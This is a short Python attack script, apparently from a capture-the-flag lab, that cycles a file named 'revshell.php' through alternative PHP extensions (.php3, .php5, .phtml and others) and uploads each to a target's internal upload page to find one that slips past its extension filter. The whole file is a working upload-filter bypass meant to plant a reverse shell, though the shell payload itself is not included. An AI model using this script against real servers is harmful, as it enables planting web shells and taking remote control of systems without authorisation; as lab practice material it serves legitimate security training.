#!/usr/bin/env python

import requests
import os

ip = "10.10.132.98"
url = 'http://'+ ip +':3333/internal/index.php'

old_filename = "revshell.php"

filename = "revshell"
extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml"
]

for ext in extensions:
    new_filename = filename + ext
    os.rename(old_filename, new_filename)

    files = {"file": open(new_filename, "rb")}
    res = requests.post(url, files=files)

    if "Extension not allowed" in res.text:
        print(ext + ' not allowed')
    else:
        print(ext + ' seems to be allowed')

    old_filename = new_filename
